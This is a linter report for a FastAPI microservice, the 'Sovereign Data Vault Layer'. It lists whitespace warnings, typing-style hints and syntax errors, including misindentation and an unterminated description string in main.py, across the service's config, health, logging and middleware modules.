  --> emergent-microservices\sovereign-data-vault\app\config.py:39:1
   |
37 | DB_POOL_SIZE: int = 20
38 |     DB_TIMEOUT: int = 30
39 |     
   | ^^^^
40 |     # Observability
41 |     LOG_LEVEL: str = "INFO"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\config.py:45:1
   |
43 |     ENABLE_TRACING: bool = true
44 |     METRICS_PORT: int = 9090
45 |     
   | ^^^^
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\config.py:48:1
   |
46 |     # Feature Flags
47 |     ENABLE_API_DOCS: bool = true
48 |     
   | ^^^^
49 |     model_config = SettingsConfigDict(
50 |         env_file=".env",
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\config.py:55:1
   |
53 |         extra="ignore",
54 |     )
55 |     
   | ^^^^
56 |     def is_production(self) -> bool:
57 |         """Check if running in production"""
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\config.py:59:1
   |
57 |         """Check if running in production"""
58 |         return self.ENVIRONMENT == "production"
59 |     
   | ^^^^
60 |     def is_development(self) -> bool:
61 |         """Check if running in development"""
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\sovereign-data-vault\app\config.py:66:1
   |
65 | # Global settings instance
66 | settings = Settings()
   | ^
67 |
68 | # Validate critical settings on import
   |

invalid-syntax: Expected an indented block after `if` statement
  --> emergent-microservices\sovereign-data-vault\app\config.py:70:1
   |
68 | # Validate critical settings on import
69 | if settings.is_production():
70 | if "changeme" in settings.API_KEYS:
   | ^^
71 |         raise ValueError("API_KEYS must be changed in production")
72 | if settings.JWT_SECRET == "changeme-secret-key":
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\sovereign-data-vault\app\errors.py:5:1
  |
3 | """
4 |
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from fastapi import FastAPI, Request, status
  |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\sovereign-data-vault\app\errors.py:21:18
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^
22 |     ):
23 |         self.message = message
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\errors.py:21:27
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                           ^^^^
22 |     ):
23 |         self.message = message
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\sovereign-data-vault\app\errors.py:33:47
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\errors.py:33:56
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\sovereign-data-vault\app\errors.py:79:47
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\errors.py:79:56
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\health.py:41:1
   |
39 |     checks = {}
40 |     all_ready = True
41 |     
   | ^^^^
42 |     # Check database connection
43 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\health.py:52:1
   |
50 |         checks["database"] = "error"
51 |         all_ready = False
52 |     
   | ^^^^
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\health.py:55:1
   |
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
55 |     
   | ^^^^
56 |     return HealthResponse(
57 |         status=response_status,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\health.py:82:1
   |
80 |     checks = {}
81 |     startup_complete = True
82 |     
   | ^^^^
83 |     # Check database connection
84 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\health.py:93:1
   |
91 |         checks["database"] = "error"
92 |         startup_complete = False
93 |     
   | ^^^^
94 | # Check migrations
95 |     try:
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\sovereign-data-vault\app\health.py:106:1
    |
104 |         startup_complete = False
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
    | ^^^^
107 |     
108 |     return HealthResponse(
    |

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\health.py:107:1
    |
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
107 |     
    | ^^^^
108 |     return HealthResponse(
109 |         status=response_status,
    |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
   --> emergent-microservices\sovereign-data-vault\app\health.py:115:1
    |
113 |         checks=checks,
114 |     )
    |      ^
    |

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\logging_config.py:17:1
   |
15 | class JSONFormatter(logging.Formatter):
16 |     """JSON log formatter for structured logging"""
17 |     
   | ^^^^
18 |     def format(self, record: logging.LogRecord) -> str:
19 |         log_data: Dict[str, Any] = {
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\logging_config.py:27:1
   |
25 |             "version": "1.0.0",
26 |         }
27 |         
   | ^^^^^^^^
28 |         # Add request ID if available
29 |         request_id = request_id_var.get()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\logging_config.py:32:1
   |
30 |         if request_id:
31 |             log_data["request_id"] = request_id
32 |         
   | ^^^^^^^^
33 |         # Add exception info if present
34 |         if record.exc_info:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\logging_config.py:36:1
   |
34 |         if record.exc_info:
35 |             log_data["exception"] = self.formatException(record.exc_info)
36 |         
   | ^^^^^^^^
37 |         # Add extra fields
38 |         if hasattr(record, "extra"):
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\logging_config.py:40:1
   |
38 |         if hasattr(record, "extra"):
39 |             log_data.update(record.extra)
40 |         
   | ^^^^^^^^
41 |         return json.dumps(log_data)
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\sovereign-data-vault\app\logging_config.py:49:1
   |
47 | handler.setFormatter(JSONFormatter())
48 | # Configure root logger
49 |     logging.root.handlers = [handler]
   | ^^^^
50 |     logging.root.setLevel("INFO")
   |

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\logging_config.py:51:1
   |
49 |     logging.root.handlers = [handler]
50 |     logging.root.setLevel("INFO")
51 |     
   | ^^^^
52 |     # Reduce noise from third-party libraries
53 |     logging.getLogger("uvicorn").setLevel(logging.WARNING)
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\sovereign-data-vault\app\logging_config.py:58:1
   |
57 | # Create module logger
58 | logger = logging.getLogger("sovereign_data_vault_layer")
   | ^
   |

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\main.py:60:1
   |
58 |     # Startup
59 |     logger.info("Starting Sovereign Data Vault Layer service v1.0.0")
60 |     
   | ^^^^
61 |     # Initialize database
62 |     await database.connect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\main.py:64:1
   |
62 |     await database.connect()
63 |     logger.info("Database connection established")
64 |     
   | ^^^^
65 |     # Run migrations if needed
66 | from .repository import run_migrations
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\sovereign-data-vault\app\main.py:67:1
   |
65 |     # Run migrations if needed
66 | from .repository import run_migrations
67 |     await run_migrations()
   | ^^^^
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\sovereign-data-vault\app\main.py:69:1
   |
67 |     await run_migrations()
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   | ^
70 |     
71 |     yield
   |

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\main.py:70:1
   |
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
70 |     
   | ^^^^
71 |     yield
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\sovereign-data-vault\app\main.py:71:1
   |
69 | logger.info("Service startup complete")
70 |     
71 |     yield
   | ^^^^
72 |     
73 |     # Shutdown
   |

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\main.py:72:1
   |
71 |     yield
72 |     
   | ^^^^
73 |     # Shutdown
74 |     logger.info("Shutting down Sovereign Data Vault Layer service")
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\main.py:75:1
   |
73 |     # Shutdown
74 |     logger.info("Shutting down Sovereign Data Vault Layer service")
75 |     
   | ^^^^
76 |     # Close database connections
77 |     await database.disconnect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\main.py:79:1
   |
77 |     await database.disconnect()
78 |     logger.info("Database connections closed")
79 |     
   | ^^^^
80 |     logger.info("Service shutdown complete")
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\sovereign-data-vault\app\main.py:84:1
   |
83 | # Create FastAPI application
84 | app = FastAPI(
   | ^
85 |     title="Sovereign Data Vault Layer",
86 |     description="Microservices:
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\sovereign-data-vault\app\main.py:86:17
   |
84 | app = FastAPI(
85 |     title="Sovereign Data Vault Layer",
86 |     description="Microservices:
   |                 ^^^^^^^^^^^^^^^
87 | Zero-knowledge encryption layer
88 | Capability-based access control
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:87:1
   |
85 |     title="Sovereign Data Vault Layer",
86 |     description="Microservices:
87 | Zero-knowledge encryption layer
   | ^^^^
88 | Capability-based access control
89 | Time-bound decryption tokens
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:87:16
   |
85 |     title="Sovereign Data Vault Layer",
86 |     description="Microservices:
87 | Zero-knowledge encryption layer
   |                ^^^^^^^^^^
88 | Capability-based access control
89 | Time-bound decryption tokens
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:87:27
   |
85 |     title="Sovereign Data Vault Layer",
86 |     description="Microservices:
87 | Zero-knowledge encryption layer
   |                           ^^^^^
88 | Capability-based access control
89 | Time-bound decryption tokens
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:88:1
   |
86 |     description="Microservices:
87 | Zero-knowledge encryption layer
88 | Capability-based access control
   | ^^^^^^^^^^
89 | Time-bound decryption tokens
90 | Audit trail hashing
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:88:18
   |
86 |     description="Microservices:
87 | Zero-knowledge encryption layer
88 | Capability-based access control
   |                  ^^^^^^
89 | Time-bound decryption tokens
90 | Audit trail hashing
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:88:25
   |
86 |     description="Microservices:
87 | Zero-knowledge encryption layer
88 | Capability-based access control
   |                         ^^^^^^^
89 | Time-bound decryption tokens
90 | Audit trail hashing
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:89:1
   |
87 | Zero-knowledge encryption layer
88 | Capability-based access control
89 | Time-bound decryption tokens
   | ^^^^
90 | Audit trail hashing
91 | Revocation propagation service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:89:12
   |
87 | Zero-knowledge encryption layer
88 | Capability-based access control
89 | Time-bound decryption tokens
   |            ^^^^^^^^^^
90 | Audit trail hashing
91 | Revocation propagation service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:89:23
   |
87 | Zero-knowledge encryption layer
88 | Capability-based access control
89 | Time-bound decryption tokens
   |                       ^^^^^^
90 | Audit trail hashing
91 | Revocation propagation service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:90:1
   |
88 | Capability-based access control
89 | Time-bound decryption tokens
90 | Audit trail hashing
   | ^^^^^
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:90:7
   |
88 | Capability-based access control
89 | Time-bound decryption tokens
90 | Audit trail hashing
   |       ^^^^^
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:90:13
   |
88 | Capability-based access control
89 | Time-bound decryption tokens
90 | Audit trail hashing
   |             ^^^^^^^
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:91:1
   |
89 | Time-bound decryption tokens
90 | Audit trail hashing
91 | Revocation propagation service
   | ^^^^^^^^^^
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
93 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:91:12
   |
89 | Time-bound decryption tokens
90 | Audit trail hashing
91 | Revocation propagation service
   |            ^^^^^^^^^^^
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
93 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:91:24
   |
89 | Time-bound decryption tokens
90 | Audit trail hashing
91 | Revocation propagation service
   |                        ^^^^^^^
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
93 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:1
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   | ^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found `case`
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:5
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |     ^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:9
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |         ^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Got unexpected token ΓÇ£
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:11
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |           ^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:12
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |            ^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:17
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                 ^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:23
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                       ^^^^^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:32
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                ^^^^^^^^^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:45
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                             ^^^^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:53
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                     ^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:58
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                          ^^^^^^^^^^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:72
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                        ^^^^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:72
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                        ^^^^^^^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Got unexpected token ΓÇ¥
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:80
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                                ^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found Unknown
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:80
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                                ^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\sovereign-data-vault\app\main.py:92:81
   |
90 | Audit trail hashing
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                                 ^^
93 |     version="1.0.0",
94 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\app\main.py:93:5
   |
91 | Revocation propagation service
92 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
93 |     version="1.0.0",
   |     ^^^^^^^
94 |     lifespan=lifespan,
95 | docs_url="/api/v1/docs",
   |

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:18:1
   |
16 | class RequestIDMiddleware(BaseHTTPMiddleware):
17 |     """Add unique request ID to each request"""
18 |     
   | ^^^^
19 |     async def dispatch(self, request: Request, call_next: Callable):
20 |         # Generate or extract request ID
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:22:1
   |
20 |         # Generate or extract request ID
21 |         request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
22 |         
   | ^^^^^^^^
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:25:1
   |
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
25 |         
   | ^^^^^^^^
26 |         # Add to request state
27 |         request.state.request_id = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:28:1
   |
26 |         # Add to request state
27 |         request.state.request_id = request_id
28 |         
   | ^^^^^^^^
29 |         # Call next middleware
30 |         response = await call_next(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:31:1
   |
29 |         # Call next middleware
30 |         response = await call_next(request)
31 |         
   | ^^^^^^^^
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:34:1
   |
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
34 |         
   | ^^^^^^^^
35 |         return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:40:1
   |
38 | class MetricsMiddleware(BaseHTTPMiddleware):
39 |     """Collect Prometheus metrics for requests"""
40 |     
   | ^^^^
41 |     async def dispatch(self, request: Request, call_next: Callable):
42 |         # Skip metrics endpoint itself
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:45:1
   |
43 |         if request.url.path == "/metrics":
44 |             return await call_next(request)
45 |         
   | ^^^^^^^^
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:48:1
   |
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
48 |         
   | ^^^^^^^^
49 |         # Record start time
50 |         start_time = time.time()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:51:1
   |
49 |         # Record start time
50 |         start_time = time.time()
51 |         
   | ^^^^^^^^
52 |         try:
53 |             # Process request
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:55:1
   |
53 |             # Process request
54 |             response = await call_next(request)
55 |             
   | ^^^^^^^^^^^^
56 |             # Record metrics
57 |             duration = time.time() - start_time
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:59:1
   |
57 |             duration = time.time() - start_time
58 |             status_class = f"{response.status_code // 100}xx"
59 |             
   | ^^^^^^^^^^^^
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:62:1
   |
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
62 |             
   | ^^^^^^^^^^^^
63 |             REQUEST_COUNT.labels(
64 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:68:1
   |
66 |                 status_class=status_class,
67 |             ).inc()
68 |             
   | ^^^^^^^^^^^^
69 |             REQUEST_DURATION.labels(
70 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:73:1
   |
71 |                 route_template=route_template,
72 |             ).observe(duration)
73 |             
   | ^^^^^^^^^^^^
74 |             return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:75:1
   |
74 |             return response
75 |         
   | ^^^^^^^^
76 |         finally:
77 |             # Decrement inflight requests
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:79:1
   |
77 |             # Decrement inflight requests
78 |             INFLIGHT_REQUESTS.dec()
79 |     
   | ^^^^
80 |     @staticmethod
81 |     def _get_route_template(request: Request) -> str:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:90:1
   |
88 | class RateLimitMiddleware(BaseHTTPMiddleware):
89 |     """Token bucket rate limiter"""
90 |     
   | ^^^^
91 |     def __init__(self, app, requests_per_minute: int = 100, burst: int = 200):
92 |         super().__init__(app)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\sovereign-data-vault\app\middleware.py:97:1
   |
95 |         self.tokens = {}  # client_id -> (tokens, last_update)
96 |         self.rate = requests_per_minute / 60.0  # tokens per second
97 |     
   | ^^^^
98 |     async def dispatch(self, request: Request, call_next: Callable):
99 |         # Skip health checks and metrics
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:102:1
    |
100 |         if request.url.path in ["/health", "/health/ready", "/health/live", "/metrics"]:
101 |             return await call_next(request)
102 |         
    | ^^^^^^^^
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:105:1
    |
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
105 |         
    | ^^^^^^^^
106 |         # Check rate limit
107 |         if not self._allow_request(client_id):
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:120:1
    |
118 |                 headers={"Retry-After": "60"},
119 |             )
120 |         
    | ^^^^^^^^
121 |         return await call_next(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:122:1
    |
121 |         return await call_next(request)
122 |     
    | ^^^^
123 |     def _get_client_id(self, request: Request) -> str:
124 |         """Get client identifier for rate limiting"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:128:1
    |
126 |         if hasattr(request.state, "user"):
127 |             return f"user:{request.state.user}"
128 |         
    | ^^^^^^^^
129 |         # Fall back to IP address
130 |         forwarded_for = request.headers.get("X-Forwarded-For")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:133:1
    |
131 |         if forwarded_for:
132 |             return f"ip:{forwarded_for.split(',')[0].strip()}"
133 |         
    | ^^^^^^^^
134 |         return f"ip:{request.client.host}"
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:135:1
    |
134 |         return f"ip:{request.client.host}"
135 |     
    | ^^^^
136 |     def _allow_request(self, client_id: str) -> bool:
137 |         """Check if request is allowed (token bucket algorithm)"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:139:1
    |
137 |         """Check if request is allowed (token bucket algorithm)"""
138 |         now = time.time()
139 |         
    | ^^^^^^^^
140 |         if client_id not in self.tokens:
141 |             self.tokens[client_id] = (self.burst - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:143:1
    |
